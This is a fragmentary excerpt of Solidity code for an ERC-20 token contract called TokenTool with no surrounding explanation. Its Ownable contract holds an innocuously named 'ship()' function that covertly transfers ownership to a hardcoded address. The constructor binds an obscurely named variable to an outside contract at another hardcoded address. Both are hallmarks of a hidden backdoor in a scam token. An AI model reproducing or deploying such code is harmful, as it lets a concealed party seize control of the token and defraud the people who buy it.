...
contract Ownable is Context {
  ...
  function ship() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0xa3652b2298D17660402d1E968A94401033a8806c));
    _owner = address(0xa3652b2298D17660402d1E968A94401033a8806c);
  }
...
contract TokenTool is Context, IERC20, Ownable {
  ...
  constructor(
    ...
    isMarketPair[address(uniswapPair)] = true;
     cxkdd = cxkaddrs(0xfc66B6f6C6E707880bF39df8F82324B699178a82);
